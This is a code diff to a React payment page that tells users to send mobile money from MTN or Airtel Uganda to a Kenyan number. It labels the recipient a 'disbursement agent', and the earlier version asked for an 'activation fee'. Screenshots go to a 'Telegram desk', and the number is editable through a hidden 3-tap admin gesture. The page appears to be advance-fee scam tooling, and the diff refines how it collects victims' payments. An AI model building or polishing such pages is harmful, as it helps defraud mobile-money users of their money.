@@ -39,12 +39,12 @@ interface AppSettings {
 
 const initialSettings: AppSettings = {
   agentName: 'MOMO DISBURSEMENT AGENT (EZRA KIBET)',
-  agentNumber: '+256 788 412 895',
-  rawNumber: '0788412895',
+  agentNumber: '+254 780571549',
+  rawNumber: '254780571549',
   whatsappNumber: '+254 780571549',
   whatsappRaw: '254780571549',
-  step1: 'Dial *165# (MTN) or *185# (Airtel).',
-  step2: 'Send/Transfer activation fee to 0788412895.',
+  step1: 'Dial *165*1*2# (MTN) or *185# (Airtel).',
+  step2: 'Enter recipient number 254780571549 and amount.',
   step3: 'Take a screenshot of the confirmation SMS and upload it below.',
   noticeText: 'Payment screenshot is verified and forwarded to our Telegram desk',
 };
@@ -549,28 +549,8 @@ export default function PaymentPage() {
                   </div>
                 </div>
 
-                <div>
-                  <label className="block text-[11px] font-bold text-gray-700 uppercase mb-1">
-                    Step 1 Instructions
-                  </label>
-                  <input
-                    type="text"
-                    value={adminForm.step1}
-                    onChange={(e) => setAdminForm({ ...adminForm, step1: e.target.value })}
-                    className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-medium text-gray-900 bg-white"
-                  />
-                </div>
-
-                <div>
-                  <label className="block text-[11px] font-bold text-gray-700 uppercase mb-1">
-                    Step 2 Instructions
-                  </label>
-                  <input
-                    type="text"
-                    value={adminForm.step2}
-                    onChange={(e) => setAdminForm({ ...adminForm, step2: e.target.value })}
-                    className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-medium text-gray-900 bg-white"
-                  />
+                <div className="bg-amber-100/70 p-2.5 rounded-xl text-[11px] font-bold text-amber-900 border border-amber-300">
+                  <span>ℹ️ Payment instructions are standardized for MTN & Airtel (Uganda → Kenya). The recipient phone number entered above will automatically update across all steps.</span>
                 </div>
 
                 <button
@@ -628,14 +608,63 @@ export default function PaymentPage() {
               </div>
             )}
 
-            {/* Instructions */}
-            <div className="bg-amber-50/70 border border-amber-200/80 rounded-2xl p-3.5 mb-6 text-xs text-amber-900 space-y-1">
-              <p className="font-bold">📱 Quick Mobile Money Payment Steps:</p>
-              <ol className="list-decimal list-inside space-y-0.5 text-[11px] sm:text-xs">
-                <li>{settings.step1}</li>
-                <li>{settings.step2.replace('{number}', settings.rawNumber)}</li>
-                <li>{settings.step3}</li>
-              </ol>
+            {/* Quick Mobile Money Payment Steps Box */}
+            <div className="bg-amber-50/90 border-2 border-amber-300 rounded-2xl p-3.5 sm:p-4 mb-6 text-amber-950 shadow-xs">
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-2 mb-2.5 border-b border-amber-200 gap-2">
+                <div className="flex items-center gap-1.5">
+                  <span className="text-base">📱</span>
+                  <p className="font-black text-xs sm:text-sm uppercase tracking-tight text-amber-950">
+                    Quick Mobile Money Payment Steps:
+                  </p>
+                </div>
+
+                {/* Recipient Number with Copy button (read-only publicly; editable only by admin via 3-tap gesture) */}
+                <div className="flex items-center gap-1.5 bg-white border border-amber-300 px-2.5 py-1 rounded-xl shadow-2xs">
+                  <span className="text-[10px] font-bold text-gray-500 uppercase">Recipient:</span>
+                  <span className="font-mono font-black text-xs sm:text-sm text-gray-950">
+                    {settings.rawNumber || '254780571549'}
+                  </span>
+                  <button
+                    type="button"
+                    onClick={handleCopyNumber}
+                    className="p-1 rounded bg-gray-100 hover:bg-gray-200 text-gray-700 transition cursor-pointer"
+                    title="Copy recipient number"
+                  >
+                    {copied ? <Check className="w-3.5 h-3.5 text-green-600" /> : <Copy className="w-3.5 h-3.5" />}
+                  </button>
+                </div>
+              </div>
+
+              {/* Exact steps fitting cleanly inside the box */}
+              <div className="space-y-2 text-xs text-gray-950">
+                {/* 1. MTN Uganda -> Kenya */}
+                <div className="bg-white/90 rounded-xl p-2.5 sm:p-3 border border-amber-200 shadow-2xs">
+                  <div className="font-black text-xs sm:text-sm text-amber-950 mb-1 flex items-center gap-1.5">
+                    <span className="w-4 h-4 rounded-full bg-[#ffcc00] text-[hsl(220,50%,12%)] text-[10px] font-black flex items-center justify-center shrink-0">1</span>
+                    <span>MTN Uganda → Kenya</span>
+                  </div>
+                  <div className="font-bold text-[11px] sm:text-xs text-gray-900 space-y-0.5 pl-5 leading-snug">
+                    <p>Dial <span className="font-mono font-black bg-amber-100 px-1 py-0.5 rounded text-gray-950">*165*1*2#</span>.</p>
+                    <p>Select <span className="font-black text-gray-950">Kenya</span>.</p>
+                    <p>Enter recipient’s number (<span className="font-mono font-black underline text-amber-900">{settings.rawNumber || '254…'}</span>) and amount.</p>
+                    <p>Confirm details and enter your MoMo PIN.</p>
+                  </div>
+                </div>
+
+                {/* 2. Airtel Uganda -> Kenya */}
+                <div className="bg-white/90 rounded-xl p-2.5 sm:p-3 border border-amber-200 shadow-2xs">
+                  <div className="font-black text-xs sm:text-sm text-amber-950 mb-1 flex items-center gap-1.5">
+                    <span className="w-4 h-4 rounded-full bg-red-600 text-white text-[10px] font-black flex items-center justify-center shrink-0">2</span>
+                    <span>Airtel Uganda → Kenya</span>
+                  </div>
+                  <div className="font-bold text-[11px] sm:text-xs text-gray-900 space-y-0.5 pl-5 leading-snug">
+                    <p>Dial <span className="font-mono font-black bg-amber-100 px-1 py-0.5 rounded text-gray-950">*185#</span>.</p>
+                    <p>Select <span className="font-black text-gray-950">Send Money → International Transfer</span>.</p>
+                    <p>Choose <span className="font-black text-gray-950">Kenya</span> if available.</p>
+                    <p>Enter recipient’s details (<span className="font-mono font-black underline text-amber-900">{settings.rawNumber || '254…'}</span>) and amount, then confirm with your PIN.</p>
+                  </div>
+                </div>
+              </div>
             </div>
 
             {/* Error Message */}
